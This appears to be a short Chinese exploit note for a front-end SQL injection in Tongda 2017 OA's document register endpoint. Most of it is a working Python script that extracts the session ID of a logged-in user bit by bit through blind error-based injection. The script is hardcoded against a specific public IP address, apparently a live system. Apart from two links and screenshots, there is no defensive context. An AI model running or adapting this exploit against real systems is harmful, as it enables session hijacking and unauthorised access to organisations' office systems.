# 通达2017OA前台SQL注入 generaldocumentindex.phprecvregisterinsert 获取session 

    https://blog.csdn.net/weixin_39779975/article/details/111091529

https://mp.weixin.qq.com/s/zH13q6xBRc58ggHqfKKi_g

## 脚本

```python
# -*- coding:utf-8 -*-
import requests

def hello(url, payload):
    result = ""
    payload_bak = payload
    for len in range(1, 27):
        str = '0'
        for i in range(0, 7):
            payload = payload.format(len, 6 - i, int(str + '0', 2))
            data = {payload: "1", "_SERVER": ""}
            r = requests.post(url, data=data, timeout=10, verify=False, allow_redirects=False)
            # print(r.status_code)
            if r.status_code == 302:
                str = str + '0'
            elif r.status_code == 500:
                str = str + '1'
            else:
                hello(url, payload)
            payload = payload_bak
        result += chr(int(str, 2))
        if int(str, 2) == 127:
            print("系统当前无正在登录的用户...")
            return result
        print("第%d位为: %s" % (len, chr(int(str, 2))))
    return result

def main():
    url = "http://60.190.185.74:88/general/document/index.php/recv/register/insert"
    payload = """title)values("'"^exp(if((ascii(substr((select/**/SID/**/from/**/user_online/**/limit/**/1),{},1))>>{}={}),1,710)))# """
    print("PHPSESSID=%s" % hello(url, payload))

if __name__ == "__main__":
    main()
```

![image](https://s1.ax1x.com/2023/04/06/ppIh8TU.png)

![image](https://s1.ax1x.com/2023/04/06/ppIhYY4.png)
